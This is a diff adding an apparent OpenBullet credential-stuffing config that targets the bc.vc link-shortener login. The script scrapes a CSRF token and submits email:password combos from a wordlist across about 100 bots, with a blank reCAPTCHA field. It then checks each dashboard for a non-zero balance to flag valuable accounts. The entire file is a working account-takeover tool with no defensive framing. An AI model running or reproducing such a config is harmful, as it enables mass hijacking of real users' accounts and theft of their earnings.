@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "BCVC",
+  "SuggestedBots": 100,
+  "LastModified": "2019-05-29T18:26:30.1748225+03:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "Author": "3zm4N",
+  "Version": "1.2.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "EmailPass",
+  "AllowedWordlist2": "EmailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://bc.vc/panel/login.php" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#Token PARSE "<SOURCE>" LR "\"dsfe\" value=\"" "\"" -> VAR "Token" 
+#Login REQUEST POST "https://bc.vc/panel/login.php" 
+  CONTENT "email=<USER>&password=<PASS>&dsfe=<Token>&sign_now=11&g-recaptcha-response=&sign_now=11" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://bc.vc" 
+  HEADER "referer: https://bc.vc/panel/login.php" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Balance " 
+    KEY "User Notification" 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, input is wrong!" 
+REQUEST GET "https://bc.vc/panel/dashboard.php" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "0.00 $" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "0.00 $" 
